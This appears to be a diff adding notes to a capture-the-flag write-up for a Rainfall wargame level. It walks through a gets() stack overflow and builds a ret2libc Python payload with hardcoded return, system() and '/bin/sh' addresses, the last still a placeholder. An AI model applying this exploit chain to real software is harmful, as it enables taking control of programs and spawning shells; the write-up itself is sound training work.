@@ -15,3 +15,43 @@ search for format string exploit or gets or strcpy
 		the address of exit with the address of system.
 	- After a fast check with "%x %x %x %x" no address is leaked so lest search
 		for another vulnerability, lets try to exploit gets.
+	- We can observe at in function p at <> that the stack frame size is 76, so
+		i tried to insert 76 carracters and a SIGSEGV is raised. That means is
+		possible to have control over eip and gain control !
+	- I think ret2libc is a good way of explotaion.
+
+2) Conclusion
+
+Note: Before exploit to the binary i decided to reverse it and write it in c, when i finished
+		i realised i've alreaddy done this exploit before start Rainfall as traning
+		is this page: https://exploit.education/protostar/stack-six/
+		and i saw a tutorial here: https://www.youtube.com/watch?v=m17mV24TgwY&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=16
+
+So what is needed to ret2libc ?
+
+1) "Skip" the return address (jump into itself: increment a NOP and increment esp)
+2) Then after that, write the address of the function system in the libc
+3) After that, write some return address for systhem
+4) And finally write the argument of systhem ("/bin/sh") (write it's address)
+
+Following this steps the stack will look exactly as the same as we performed a call intruction
+
+So first of all some addresses are needed:
+1) Ret opcode in function p address: 0x804853e
+2) System address in libc: 0xb7e6b060 (in gdb type "p system")
+3) Adress of "/bin/sh": HERE ADDR (found using: 'strings -a -t x /lib/libc.2.11.2.so | grep "/bin/sh"')
+
+// TO DO: Need fckg ssh conection works to find the address of "/bin/sh" fck the open source bugged vms who doesn't support basic networking...
+// probally is another version to the lib
+
+So the python script performs the exploit
+
+import struct
+
+padding = "A"*80						# all the stack frame + sebp 
+seip = struct.pack("I", 0x804853e)		# seip (NOP and jump to next intruction)
+system = struct.pack("I", 0xb7e6b060)	# seip + 4 (start call simulation)
+system_ret = "A"*4						# seip + 8 (simulate push eip)
+binsh = struct.pack("I", to do)			# seip + 12 (simulate push rdi)
+
+print padding + seip + system + system_ret + binsh
